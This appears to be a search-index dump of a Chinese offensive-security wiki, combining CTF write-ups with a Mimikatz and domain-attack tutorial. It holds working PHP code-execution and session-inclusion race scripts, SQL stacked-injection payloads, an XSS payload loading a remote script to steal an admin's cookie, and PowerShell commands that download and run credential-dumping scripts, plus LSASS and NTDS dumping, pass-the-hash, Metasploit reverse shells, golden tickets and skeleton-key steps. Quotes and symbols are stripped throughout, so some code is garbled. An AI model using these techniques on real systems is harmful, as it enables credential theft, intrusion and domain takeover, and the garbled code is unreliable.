)url+?c=print_r(array_reverse(scandir(getcwd()))); == Array ( [0] = index.php [1] = flag.php [2] = .. [3] = . )url+?c=print_r(next(array_reverse(scandir(getcwd())))); == flag.phpurl+?c=print_r(show_source(next(array_reverse(scandir(getcwd()))))); == $flag=ctfshoweca2e7df-d196-4b71-9632-ad4d32e194d3; 读取目录getallheaders()：返回所有的HTTP头信息，返回的是数组⽽eval要求为字符串，所以要⽤implode()函数将数组转换为字符串get_defined_vars()：该函数的作⽤是获取所有的已定义变量，返回值也是数组，不过是⼆维数组，⽤var_dump()输出可以看⻅输出的内容，看⻅在第⼏位之后，可以⽤current()函数来获取其值，详细可以看官⽅函数。payload：var_dump(current(get_defined_vars()));session_id()：session_id()可以⽤来获取/设置当前会话 ID，可以⽤这个函数来获取cookie中的phpsessionid，并且这个值我们是可控的。 如可以在cookie中设置 PHPSESSID=706870696e666f28293b，然后⽤hex2bin()函数，即传⼊?exp=eval(hex2bin(session_id(session_start()))); 并设置cookie：PHPSESSID=706870696e666f28293b session_start 函数是为了开启session配合使⽤的函数：print_r(scandir(‘.’)); 查看当前⽬录下的所有⽂件名 var_dump()localeconv() 函数返回⼀包含本地数字及货币格式信息的数组。current() 函数返回数组中的当前元素（单元）,默认取第⼀个值，pos是current的别名each() 返回数组中当前的键/值对并将数组指针向前移动⼀步end() 将数组的内部指针指向最后⼀个单元next() 将数组中的内部指针向前移动⼀位prev() 将数组中的内部指针倒回⼀位array_reverse() 以相反的元素顺序返回数组","tags":[null]},{"title":"linux标准输入输出","path":"/wiki/WP/REC/linux标准输入输出.html","content":"web42if(isset($_GET[c])) $c=$_GET[c]; system($c. /dev/null 21);else highlight_file(__FILE__); 知识点 devnull 210 标准输⼊1 标准输出2 错误输出在类Unix系统中,/dev/null,或称空设备,是⼀个特殊的设备⽂件,它丢弃⼀切写⼊其中的数据(但报告写⼊操作成功)区别：2/dev/null 把错误输出到空设备（即丢弃）/dev/null 21 相当于1/dev/null 21 即把标准输出丢弃，并且把错误输出输出到标准输出。合计起来就是错误和标准输出都输出到空设备21 /dev/null 错误输出到标准输出，即输出到屏幕上，⽽标准输出被丢弃重定向 和 前者会先清空⽂件，然后再写⼊内容，后者会将重定向的内容追加到现有⽂件的尾部. 解题关键点 分割：| || ?c=tac flag |ls;","tags":[null]},{"title":"无字母","path":"/wiki/WP/REC/无字母.html","content":"知识点bin为binary的简写，主要放置⼀些系统的必备执⾏档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。我们⽇常直接使⽤的cat或者ls等等都其实是简写，例如ls完整全称应该是/bin/ls","tags":[null]},{"title":"获取目录","path":"/wiki/WP/REC/获取目录.html","content":"函数","tags":[null]},{"title":"Windows提权","path":"/wiki/WP/Windows提权/index.html","content":"vulnhub 文件夹 (包含子项) 📂 目录"},{"title":"读取文件","path":"/wiki/WP/REC/读取文件.html","content":"函数highlight_file($filename);show_source($filename);require($filename)print_r(php_strip_whitespace($filename));print_r(file_get_contents($filename));readfile($filename);print_r(file($filename)); // var_dumpfread(fopen($filename,r), $size);include($filename); // ⾮php代码include_once($filename); // ⾮php代码require($filename); // ⾮php代码require_once($filename); // ⾮php代码print_r(fread(popen(cat flag, r), $size));print_r(fgets(fopen($filename, r))); // 读取⼀⾏fpassthru(fopen($filename, r)); // 从当前位置⼀直读取到 EOFprint_r(fgetcsv(fopen($filename,r), $size));print_r(fgetss(fopen($filename, r))); // 从⽂件指针中读取⼀⾏并过滤掉 HTML 标记print_r(fscanf(fopen(flag, r),%s));print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组print_r(glob(*)); // 列当前⽬录print_r(glob(/*)); // 列根⽬录print_r(scandir(.));print_r(scandir(/));$d=opendir(.);while(false!==($f=readdir($d)))echo$f ;$d=dir(.);while(false!==($f=$d-read()))echo$f. ;$a=glob(/*);foreach($a as $value)echo $value. ;$a=new DirectoryIterator(glob:///*);foreach($a as $f)echo($f-__toString(). );","tags":[null]},{"title":"root-me","path":"/wiki/WP/root-me/index.html","content":"XSS - Reflected(反射型) 点击阅读详细内容... 📝 文档 XSS--Server Side(服务端) 点击阅读详细内容... 📝 文档"},{"title":"XSS--Server Side(服务端)","path":"/wiki/WP/root-me/XSS--Server Side(服务端).html","content":"https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side进页面之后，发现可以生成信息，页面很熟悉，想到可以试试存储型sxx 发现，无论输入什么，都会返回 看到一个注册页面，试试，注册页面有没有注入点 注册之后，登录，看有没有会显示在页面上的(反射型xss特点，找页面回显的)， 说明first name 和last name 会回显 生成证书 说明可以从first name 和last name入手构造xss 然后构造payload scriptdocument.write(`iframe src=file:///flag.txt`lt;/iframe);/script 获取flag","tags":[null]},{"title":"session","path":"/wiki/WP/session/session.html","content":"题目if(isset($_GET[file])) $file = $_GET[file]; $file = str_replace(php, ???, $file); $file = str_replace(data, ???, $file); $file = str_replace(:, ???, $file); $file = str_replace(., ???, $file); include($file);else highlight_file(__FILE__); 相关知识在php5.4之后php.ini开始有⼏个默认选项 1.session.upload_progress.enabled = on 2.session.upload_progress.cleanup = on 3.session.upload_progress.prefix = “upload_progress_” 4.session.upload_progress.name = “PHP_SESSION_UPLOAD_PROGRESS” 5.session.use_strict_mode=off 第⼀个表示当浏览器向服务器上传⼀个⽂件时，php将会把此次⽂件上传的详细信息(如上传时间、上传进度等)存储在session当中 第⼆个表示当⽂件上传结束后，php将会⽴即清空对应session⽂件中的内容 第三和第四个prefix+name将表示为session中的键名 第五个表示我们对Cookie中sessionID可控简⽽⾔之，我们可以利⽤session.upload_progress将⽊⻢写⼊session⽂件，然后包含这个session⽂件。不过前提是我们需要创建⼀个session⽂件，并且知道session⽂件的存放位置。因为session.use_strict_mode=off的关系，我们可以⾃定义sessionIDlinux系统中session⽂件⼀般的默认存储位置为 /tmp 或 /var/lib/php/session例如我们在Cookie中设置了PHPSESSID=flag，php会在服务器上创建⽂件：/tmp/sess_flag，即使此时⽤户没有初始化session，php也会⾃动初始化Session。 并产⽣⼀个键值，为prefix+name的值，最后被写⼊sess_⽂件⾥还有⼀个关键点就是session.upload_progress.cleanup默认是开启的，只要读取了post数据，就会清除进度信息，所以我们需要利⽤条件竞争来pass，写⼀个脚本来完成 import ioimport requestsimport threadingurl = http://a914fd90-ab5f-44ae-a9a7-20fb9b6d991e.challenge.ctf.show/def write(session): data = PHP_SESSION_UPLOAD_PROGRESS: ?php system(tac f*);?mumuzi while True: f = io.BytesIO(ba * 1024 * 10) response = session.post(url,cookies=PHPSESSID: flag, data=data, files=file: (muzi.txt, f))def read(session): while True: response = session.get(url+?file=/tmp/sess_flag) if mumuzi in response.text: print(response.text) break else: print(retry)if __name__ == __main__: session = requests.session() write = threading.Thread(target=write, args=(session,)) write.daemon = True write.start() read(session)","tags":[null]},{"title":"sql注入","path":"/wiki/WP/sql注入/index.html","content":"杂项知识点 点击阅读详细内容... 📝 文档 绕过select,堆叠 点击阅读详细内容... 📝 文档"},{"title":"绕过select,堆叠","path":"/wiki/WP/sql注入/绕过select,堆叠.html","content":"2019强网杯”随便注”一看就是sql注入首先判断是数字还是字符注入， 输入 1 ，2，反应正常， 输入2-1 ，结果回显2 的内容，排除数字注入 输入1’ 报错，那就是 select * from database ·····id’1’; 然后就是看列数； 1’ order by 2 –+ 回显正常， order by 3–+异常，那就是两列 然后正常的注入 1’ union select 1,2 –+,发现 preg_match(“select|update|delete|drop|insert|where|.i select 等被ban 了通过报错来查看数据库，等信息 2’ and extractvalue(1,concat(0x7e,(version()),0x7e))–+ 然后可以用堆叠注入，来显示其他信息 内容就在 # supersqli 内容就在 1919810931114514怎么得到里面的内容呢？ 方法一 ：使用handlerHANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name = | = | = | | (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name FIRST | NEXT | PREV | LAST [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ FIRST | NEXT [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE 通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。 通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。 通过HANDLER tbl_name CLOSE来关闭打开的句柄。 方法二：使用预处理语句set用于设置变量名和值prepare用于预备一个语句，并赋予名称，以后可以引用该语句execute执行语句deallocate prepare用来释放掉预处理的语句-1;set @sql = CONCAT(se,lect * from `1919810931114514`;);prepare stmt from @sql;EXECUTE stmt;结果为strstr($inject, set) strstr($inject, prepare) 这里检测到了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可。-1;Set @sql = CONCAT(se,lect * from `1919810931114514`;);Prepare stmt from @sql;EXECUTE stmt; 方法三：使用rename 和 alter我们使用rename和alter这两个命令来更改表名和字段名。因为我们可以访问words里的columns，发现id，也就是说我们输入的1默认是查询words这个表的。因此我们可以把words表改名成words1表，把1919810931114514表改名成words，然后再把1919810931114514里面的flag字段改名成id，然后输入1’ or 1=1#就可以成功得到flag了。 修改表名(将表名user改为users)alter table user rename to users;修改列名(将字段名username改为name)alter table users change uesrname name varchar(30);1;alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);然后使用 1 or 1=1","tags":[null]},{"title":"杂项知识点","path":"/wiki/WP/sql注入/杂项知识点.html","content":"分类1. MD5注入 md5($password,true) md5(string,raw) 参数 描述string\t必需。要计算的字符串。 raw 可选。默认不写为FALSE。32位16进制的字符串TRUE。16位原始二进制格式的字符串 ffifdyop字符串会造成漏洞。md5(ffifdyop,true)=’or’6xxxxxx因此传入ffifdyop之后，数据库查询语句变为：select * from ‘admin’ where password= or ’6xxxxxx ’ ，变成 ‘’ or 6 MD5返回的16进制数时 出现不符合标准格式的十六进制数、不符合预期的长度、包含特殊情况或错误等情况下，会返回二进制数，经浏览器编码情况下，会变成奇怪的字符，经过不断尝试后，发现某些特定字符被mysql解析成万能密码的格式、如129581926211651571912466741651878684928、ffifdyop，但这里不能用数字型，因为限制密码长度了在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。 2.with rollupusername=admin//or//1=1//group//by//password//with/**/rollup#password= 加入with rollup后 password有一行为NULL，我们只要输入空密码使得（NULL==NULL）即可满足$password==$row[password]的限制成功登陆with rollup 是对分组后的结果进行聚合求和，在最后一行生成求和的数据。但是如果当前列是字符串无法求和的话，求和结果就会变成NULL 3.过滤了 information_schema.tables 和information_schema.columns方法一：反引号绕过 information_schema.`tables` 和 information_schema.`columns` 方法二：找平替表+无列名查询 比如ysql.innodb_table_stats (由于mysql版本不同，可利用的表也不一样) select * from users as a join users as b; 会出现a表和b表拼接成一个新表 再对其使用一个select查询进行包裹，由于会出现多个相同的列名，那么他就会报错。就可以利用此特性进行sql注入查询列名。 select * from (select * from users as a join users as b) as c; 当查询完第一个列名时，使用using排除，继续查询下一个列名。 select * from (select * from users as a join users as b using(id)) as c;实操： ?id=0 union select * from (select * from users as a join users as b) as c --+ （会显示出id） ?id=0 union select * from (select * from users as a join users as b using(id)) as c --+ （会显示出username） ?id=0 union select * from (select * from users as a join users as b using(id，username)) as c --+(会显示出第三列，以此类推)","tags":[null]},{"title":"session","path":"/wiki/WP/session/index.html","content":"session 点击阅读详细内容... 📝 文档"},{"title":"反序列化","path":"/wiki/WP/反序列化/index.html","content":"java 文件夹 (包含子项) 📂 目录 php 文件夹 (包含子项) 📂 目录"},{"title":"Lin_信息收集","path":"/wiki/内网/提权/Lin_信息收集.html","content":"项目（Item） 命令检查项（CommandCheck） 目的（Purpose） 注意事项（Notes） 风险等级（LowHigh） 行动建议（概念级） 系统与内核（System Kernel） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);uname -a/font 确定 OS 发行版、运行内核版本 vs 已安装内核版本（检测内核漏洞可能性） 关注内核版本是否存在已知提权漏洞（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);CVE-2021-4034/font 对应内核版本范围） High 对比 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);exploit-db/font 排查是否存在匹配内核漏洞；优先更新内核 当前身份与登录（Current Identity Logins） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);id/font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);last/font 定位用户账户、最近登录记录，识别潜在闲置账户或特权账户（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);uid=0/font 的 root） 检查是否存在 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo/font 权限用户或 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);wheel/font 组成员 High 审计非活跃账户，限制特权用户登录来源 SUIDSGID 文件（SUIDSGID Files） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);find / -perm -4000 2/dev/null/font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);find / -perm -2000 2/dev/null/font 查找具有 SUIDSGID 权限的二进制文件（可能被滥用提权） 结合 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);GTFOBins/font 检查文件是否存在已知滥用方法（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);find/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);nmap/font 等） High 移除不必要的 SUIDSGID 权限，使用 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);chmod u-s/font Capabilities 权限 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);getcap -r / 2/dev/null/font 查找具有 POSIX Capabilities 的文件（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);CAP_SYS_ADMIN/font 可能导致提权） 关注 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);cap_setuid+ep/font 等高风险权限，例如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);python3 = cap_setuid+ep/font High 使用 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);setcap -r 文件/font 移除危险 Capabilities 进程信息（Processes） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);ps -eo pid,user,cmd,exe/font 识别特权进程（如 root 运行的服务）及可执行文件路径 检查进程是否存在命令注入漏洞或可写的可执行文件 Medium 限制进程权限，使用 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);chroot/font 或容器隔离高危服务 文件系统权限（Filesystem） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);ls -la //font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);mount/font 检查粘性位（sticky bit）、font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);noexec/fontfont style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);nosuid/font 挂载选项、可写目录（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp/font 权限） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp/font 若为 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);rwx/font 且无粘性位，可能存在文件覆盖风险；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/etc/passwd/font 可写性需重点关注 High 对 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp/font 设置 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sticky bit/font，对系统目录启用 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);nosuid/font 计划任务（Cron Scheduled Tasks） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);crontab -l/font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);cat /etc/crontab/font 检查计划任务是否存在高风险脚本（如所有者为 root 但可被低权限用户修改的脚本） 关注 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);* * * * */font 高频任务，及 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sh /tmp/script.sh/font 等使用相对路径的命令 High 限制计划任务脚本权限为 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);root:root 600/font，避免使用相对路径 环境变量（Environment） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);echo $PATH/font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);env/font 检查 PATH 是否包含可写目录（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp/font），可能导致命令劫持 若 PATH 中可写目录位于系统目录前（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp:/usr/bin/font），风险更高 Medium 清理 PATH 中的可写目录，使用绝对路径执行命令 Sudo 配置（Sudo Privilege Escalation） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo -l/font 查找 sudo 配置错误（如无需密码的命令）及允许执行的命令（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo vi/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo find/font） 结合 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);GTFOBins/font 检查允许的命令是否存在提权方法（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo vi - :!bash/font） High 最小化 sudo 权限，禁止无密码执行敏感命令 认证日志（Auth Logs） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);cat /var/log/auth.log 2/dev/null/font 审计认证事件（如失败登录、sudo 提权尝试），识别可疑提权行为 关注 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo: PAM authentication failure/font 或 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);root : TTY=pts/0 ; COMMAND=/bin/bash/font Medium 启用日志审计工具（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);auditd/font），监控敏感命令执行 已安装包（Installed Packages） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);dpkg -l/font（Debian）；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);rpm -qa/font（RHEL） 列出已安装包版本，排查已知漏洞版本（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);polkit/font 漏洞对应版本） 结合 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);CVE Details/font 或 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);nessus/font 检查包版本是否存在本地提权漏洞 High","tags":[null]},{"title":"XSS - Reflected(反射型)","path":"/wiki/WP/root-me/XSS - Reflected(反射型).html","content":"直接看看有没有注入点 发现有个?pprices，尝试有没有注入点 报404，检查一波， 发现在链接内，可以构造一下 结果没反应，应该是被过滤掉了 发现onmousemove 和’ 可以用 但题目要求是admin 不会点击所有可疑的 XSS 链接 ，尝试本地构造隐形化xss,向服务器发送cookie， 服务器利用蓝莲花xss平台构建https://github.com/firesunCN/BlueLotus_XSSReceiver 生成本地js,构建payload 发现被过滤掉了,换种方式 ?pexp%27%20onmouseover%27(function(){var%20sdocument.createElement(%22script%22);s.src%22http://your-ip/myjs/test.js%22;document.head.appendChild(s)})()%27 给管理员提交你的报告，等待一段时间，就会返回内容，他会发送很多次，有时候没发过来，得多找一下","tags":[null]},{"title":"Mimikatz教程","path":"/wiki/内网/提权/Mimikatz教程.html","content":"0x00 简介来源：https://www.cnblogs.com/-mo-/p/11890232.html Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！ 注：但是在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。 这里放几个神器的运行姿势：九种姿势运行：Mimikatz：https://www.freebuf.com/articles/web/176796.html 借用PowerShell Copy#读取密码明文(需要管理员权限)powershell IEX (New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1); Invoke-Mimikatz –DumpCerts Copy#读取密码hash值(需要管理员权限)powershell IEX (New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1);Get-PassHashes 0x01 获取本地帐户密码1.1 本地执行下载mimikatz程序，找到自己系统对应的位数，右键以管理员身份运行： Copy#提升权限privilege::debug#抓取密码sekurlsa::logonpasswords 当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。 cmd修改注册表命令： Copyreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f#重启或用户重新登录后可以成功抓取 1.2 SAM表获取hashCopy#导出SAM数据reg save HKLM\\SYSTEM SYSTEMreg save HKLM\\SAM SAM#使用mimikatz提取hashlsadump::sam /sam:SAM /system:SYSTEM 0x02 Procdump+Mimikatz当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe: Copyprocdump64.exe -accepteula -ma lsass.exe lsass.dmp 将lsass.dmp下载到本地后，然后执行mimikatz: Copymimikatz.exe sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords full exit 为了方便复制与查看，可以输出到本地文件里面： Copymimikatz.exe sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords full pssword.txt 0x03 读取域控中域成员Hash3.1 域控本地读取注：得在域控上以域管理员身份执行mimikatz 方法一：直接执行 Copy#提升权限privilege::debug抓取密码lsadump::lsa /patch 方法二：通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取： Copy#获取所有域用户lsadump::dcsync /domain:test.com /all /csv#指定获取某个用户的hashlsadump::dcsync /domain:test.com /user:test 3.2 导出域成员HashCopy 域账户的用户名和hash密码以域数据库的形式存放在域控制器的 font style=color:rgb(192, 52, 29);background-color:rgba(0, 0, 0, 0.04);%SystemRoot% tds\\NTDS.DIT/font 文件中。 这里可以借助：ntdsutil.exe，域控制器自带的域数据库管理工具，我们可以通过域数据库，提取出域中所有的域用户信息，在域控上依次执行如下命令，导出域数据库： Copy#创建快照ntdsutil snapshot activate instance ntds create quit quit#加载快照ntdsutil snapshot mount 72ba82f0-5805-4365-a73c-0ccd01f5ed0d quit quit#Copy文件副本copy C:\\$SNAP_201911211122_VOLUMEC$\\windows\\NTDS tds.dit c: tds.dit 将ntds.dit文件拷贝到本地利用impacket脚本dump出Hash： Copysecretsdump.py -ntds.dit -system system.hive LOCAL 除了借助python，还有一个NTDSDumpEx（会被360查杀的哦）： 工具地址：https://github.com/zcgonvh/NTDSDumpEx/releases CopyNTDSDumpEx -d ntds.dit -o domain.txt -s system.hiv (system.hive文件获取:reg save hklm\\system system.hive)NTDSDumpEx -d ntds.dit -o domain.txt -r (此命令适用于在域控本地执行) 最后记得卸载删除快照： Copyntdsutil snapshot unmount 72ba82f0-5805-4365-a73c-0ccd01f5ed0d quit quitntdsutil snapshot delete 72ba82f0-5805-4365-a73c-0ccd01f5ed0d quit quit 3.3 secretsdump脚本直接导出域hash为什么要再提一遍secretsdump呢，因为它可以直接导出，说白了，简单粗暴： Copypython secretsdump.py rabbitmask:123456@192.168.15.181 首先它会导出本地SAM中的hash，然后是所有域内用户的IP，全部获取成功 0x04 哈希传递攻击PTH4.1 工作组环境当我们获得了一台主机的NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。执行完命令后，会弹出cmd窗口。 Copy#使用administrator用户的NTLM哈希值进行攻击sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9 Copy#使用xie用户的NTLM哈希值进行攻击sekurlsa::pth /user:xie /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9 在弹出的cmd窗口，我们直接可以连接该主机，并且查看该主机下的文件夹。 或者可以直接将该主机的C盘映射到本地的K盘。 注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令。 4.2 域环境在域环境中，当我们获得了域内用户的NTLM哈希值，我们可以使用域内的一台主机用mimikatz对域控进行哈希传递攻击。执行完命令后，会弹出cmd窗口。前提是我们必须拥有域内任意一台主机的本地 administrator 权限和获得了域用户的NTLM哈希值 域：xie.com域控：WIN2008.xie.com Copy#使用域管理员administrator的NTLM哈希值对域控进行哈希传递攻击sekurlsa::pth /user:administrator /domain:xie.com /ntlm:dbd621b8ed24eb627d32514476fac6c5 Copy#使用域用户xie的NTLM哈希值对域控进行哈希传递攻击sekurlsa::pth /user:xie /domain:xie.com /ntlm:329153f560eb329c0e1deea55e88a1e9 4.3 MSF进行哈希传递Copy 有些时候，当我们获取到了某台主机的Administrator用户的LM-Hash和 NTLM-Hash ，并且该主机的445端口打开着。我们则可以利用 font style=color:rgb(192, 52, 29);background-color:rgba(0, 0, 0, 0.04);exploit/windows/smb/psexec/font 漏洞用MSF进行远程登录(哈希传递攻击)。(只能是administrator用户的LM-hash和NTLM-hash)，这个利用跟工作组环境或者域环境无关。 Copymsf use exploit/windows/smb/psexecmsf exploit(psexec) set payload windows/meterpreter/reverse_tcpmsf exploit(psexec) set lhost 192.168.10.27msf exploit(psexec) set rhost 192.168.10.14msf exploit(psexec) set smbuser Administratormsf exploit(psexec) set smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6 #这里LM和NTLM我们已经获取到了msf exploit(psexec) exploit 0x05 票据传递攻击(PTT)5.1 黄金票据域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到了 krbtgt 用户的密码 Hash ，就可以随意伪造 Ticket ，进而使用 Ticket 登陆域控制器，使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket，此类攻击方法被称为票据传递攻击。 首先获取krbtgt的用户hash: Copymimikatz lsadump::dcsync /domain:xx.com /user:krbtgt 利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下： Copykerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi Copy#导入刚才生成的票据kerberos::ptt test.kiribi#导入成功后可获取域管权限dir \\\\dc.abc.com\\c$ 5.2 白银票据黄金票据和白银票据的一些区别：Golden Ticket：伪造TGT，可以获取任何 Kerberos 服务权限，且由 krbtgt 的 hash 加密，金票在使用的过程需要和域控通信 白银票据：伪造 TGS ，只能访问指定的服务，且由服务账号（通常为计算机账户）的 Hash 加密 ，银票在使用的过程不需要同域控通信 Copy#在域控上导出 DC$ 的 HASHmimikatz log privilege::debug sekurlsa::logonpasswords#利用 DC$ 的 Hash制作一张 cifs 服务的白银票据kerberos::golden /domain:ABC.COM /sid: S-1-5-21-3912242732-2617380311-62526969 /target:DC.ABC.COM /rc4:f3a76b2f3e5af8d2808734b8974acba9 /service:cifs /user:strage /ptt#cifs是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统dir \\\\DC.ABC.COM\\C$ 5.3 skeleton keyskeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。 Copy#在域控上安装 skeleton keymimikatz.exe privilege::debug misc::skeleton#在域内其他机器尝试使用 skeleton key 去访问域控，添加的密码是 mimikatznet use \\\\WIN-9P499QKTLDO.adtest.com\\c$ mimikatz /user:adtest\\administrator 微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。 Copy#适用系统windows 8.1windows server 2012 及以上 当然 mimikatz 依旧可以绕过，该功能需要导入mimidrv.sys文件，导入命令如下: Copyprivilege::debug!+!processprotect /process:lsass.exe /remove misc::skeleton 5.4 